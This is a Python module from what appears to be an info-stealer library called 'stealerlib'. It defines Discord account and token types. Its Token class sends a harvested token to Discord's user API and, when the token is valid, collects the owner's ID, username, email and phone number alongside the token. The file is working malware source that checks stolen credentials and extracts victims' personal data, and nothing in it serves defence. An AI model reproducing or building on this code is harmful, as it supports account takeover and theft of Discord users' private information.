# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/apps/discord/types.py
"""

from stealerlib.apps.discord import *
from stealerlib.request import HTTPHandler

API = HTTPHandler(base="https://discord.com/api/v9/")


class DiscordTypes:

    @dataclass
    class Account:
        id: str
        token: str
        username: str
        discriminator: str
        email: str
        phone: str

        def conv(self) -> list:
            return [
                self.id,
                self.token,
                self.username,
                self.discriminator,
                self.email,
                self.phone
            ]

    @dataclass
    class Token:
        token: str
        valid: bool=False

        def get_information(self):
            resp = API.get(
                endpoint="/users/@me",
                headers={'Authorization': self.token}
            )

            if resp.status_code == 200:
                self.valid = True
                obj_r = resp.json()
                id = obj_r['id']
                username = obj_r['username']
                email = obj_r['email']
                discriminator = obj_r['discriminator']
                phone_number = obj_r['phone']
            else:
                id = None
                username = None
                email = None
                discriminator = None
                phone_number = None

            new_account = DiscordTypes.Account(
                id=id,
                token=self.token,
                username=username,
                discriminator=discriminator,
                email=email,
                phone=phone_number,
            )

            return new_account
